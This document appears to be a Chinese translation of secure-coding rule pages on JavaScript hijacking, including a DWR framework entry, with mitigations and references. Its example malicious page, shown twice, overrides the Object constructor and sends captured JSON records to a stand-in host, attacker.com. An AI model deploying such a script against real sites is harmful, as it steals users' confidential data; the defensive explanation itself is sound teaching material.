<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当代码运行时，会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br></pre></td></tr></table></figure>
<p>（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。） 服务器使用 JSON 格式的数组进行响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/javascript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;`</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s Web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。</p>
<h5 id="RECOMMENDATIONS-24"><a href="#RECOMMENDATIONS-24" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有使用 JavaScript 进行交流的程序需要采取以下防范措施：1) 拒绝恶意请求：— 在每个返回给 JavaScript 的请求中使用一些令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：包括某些响应中的字符，这些响应只有经过了修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 <code>&lt;script&gt;</code> 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求 从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var cookies=&quot;cookies=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">http_request.open(&apos;POST&apos;, url, true);</span><br><span class="line"></span><br><span class="line">httpRequest.send(cookies);</span><br></pre></td></tr></table></figure>
<p>服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 <code>&lt;script&gt;</code> 标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应 为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 <code>&lt;script&gt;</code> 标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过<code>&lt;script&gt;</code> 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p>while(1);</p>
<p>除非客户端删除这些前缀，否则对这个消息求值将把 JavaScript 解释器发送到一个无限的循环中。客户端搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>客户端可以搜索并删除如下注释字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过 <code>&lt;script&gt;</code> 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-25"><a href="#REFERENCES-25" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[9] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="JavaScript-Hijacking-Vulnerable-Framework"><a href="#JavaScript-Hijacking-Vulnerable-Framework" class="headerlink" title="JavaScript Hijacking: Vulnerable Framework"></a>JavaScript Hijacking: Vulnerable Framework</h4><h5 id="ABSTRACT-26"><a href="#ABSTRACT-26" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>运行在 DWR Ajax framework 1.1.4 或更早版本上的应用程序容易受到 JavaScript hijacking 攻击，这将使一个未经授权的攻击者能够查看到机密信息。</p>
<h5 id="EXPLANATION-26"><a href="#EXPLANATION-26" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>DWR 的所有发行版本，包括 1.1.4 及之前的版本，都容易受到 JavaScript hijacking 攻击 [1]。直到现在，这个框架还没有建立任何防范该漏洞的机制。好消息是 DWR 2.0 能够利用一个用来防范跨站点伪装请求的机制来防范 JavaScript hijacking 攻击。由于恶意脚本无法读取由其他域设置的 cookie 中所存储的机密信息，该保护机制就利用了这一点，允许框架将 cookie 中存储的值作为在客户端和服务器端之间共享的机密信息。DWR 2.0 会自动在客户端为请求追加会话 cookie，并在服务器上验证每项请求是否均包含正确的值。</p>
<p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>当代码运行时，会生成一个如下所示的 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">GET /object.json HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR</span><br><span class="line"></span><br><span class="line">（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。） 服务器使用 JSON 格式的数组进行响应：</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Cache-control: private</span><br><span class="line"></span><br><span class="line">Content-Type: text/javascript; charset=utf-8</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Katrina&quot;, &quot;lname&quot;:&quot;O&apos;Neil&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:120000.00, &quot;email&quot;:&quot;katrina@example.com&quot; &#125;,</span><br><span class="line"></span><br><span class="line"> &#123;&quot;fname&quot;:&quot;Jacob&quot;, &quot;lname&quot;:&quot;West&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:45000.00, &quot;email&quot;:&quot;jacob@example.com&quot; &#125;]</span><br></pre></td></tr></table></figure>
<p>这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;`</span><br><span class="line"></span><br><span class="line">// override the constructor used to create all objects so</span><br><span class="line"></span><br><span class="line">// that whenever the &quot;email&quot; field is set, the method</span><br><span class="line"></span><br><span class="line">// captureObject() will run. Since &quot;email&quot; is the final field,</span><br><span class="line"></span><br><span class="line">// this will allow us to steal the whole object.</span><br><span class="line"></span><br><span class="line">function Object() &#123;</span><br><span class="line"></span><br><span class="line"> this.email setter = captureObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// Send the captured object back to the attacker&apos;s Web site</span><br><span class="line"></span><br><span class="line">function captureObject(x) &#123;</span><br><span class="line"></span><br><span class="line">  var objString = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  for (fld in this) &#123;</span><br><span class="line"></span><br><span class="line">    objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  objString += &quot;email: &quot; + x;</span><br><span class="line"></span><br><span class="line">  var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">  req.open(&quot;GET&quot;, &quot;http://attacker.com?obj=&quot; +</span><br><span class="line"></span><br><span class="line">           escape(objString),true);</span><br><span class="line"></span><br><span class="line">  req.send(null);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Use a script tag to bring in victim&apos;s data --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://www.example.com/object.json&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。</p>
<p>当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 – 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。</p>
